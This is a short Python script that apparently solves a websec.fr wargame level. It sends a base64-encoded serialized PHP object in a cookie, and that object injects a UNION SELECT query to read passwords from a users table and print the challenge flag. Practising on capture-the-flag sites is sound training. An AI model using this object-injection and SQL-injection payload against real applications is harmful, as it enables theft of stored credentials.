from requests import *

url = 'http://websec.fr/level04/index.php'
data = {
    'id' : '1',
    'submit' : 'Go'
}
cookies = {
    'leet_hax0r' : 'TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6ODE6InNlbGVjdCB1c2VybmFtZSBmcm9tIHVzZXJzIHdoZXJlIGlkPTEgdW5pb24gc2VsZWN0IHBhc3N3b3JkIGZyb20gdXNlcnMgd2hlcmUgaWQ9MSI7fQ=='
}

r = post(url , data=data , cookies=cookies)

pos = r.text.find("WEBSEC{")
while (True):
    txt = r.text[pos]
    print(txt, end='')
    if(txt == '}'):
        print()
        break
    pos += 1
